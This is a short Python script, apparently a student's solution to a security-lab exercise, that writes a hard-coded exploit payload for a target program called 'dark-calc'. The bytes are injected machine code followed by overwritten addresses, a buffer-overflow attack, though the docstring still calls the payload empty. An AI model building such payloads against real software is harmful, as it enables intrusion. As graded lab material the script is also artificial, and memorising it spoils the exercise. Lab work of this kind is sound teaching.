#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys


payload = b'\xBF\x04\x00\x00\x00\x68\xD1\x1A\x40\x00\x68\x87\x1A\x40\x00\xC3' \
+ b'\xf0\x0f\x80\x00\x10\x72\x00\x00' + b'\xd0\x0f\x80\x00\x10\x72\x00' 

sys.stdout.buffer.write(payload)
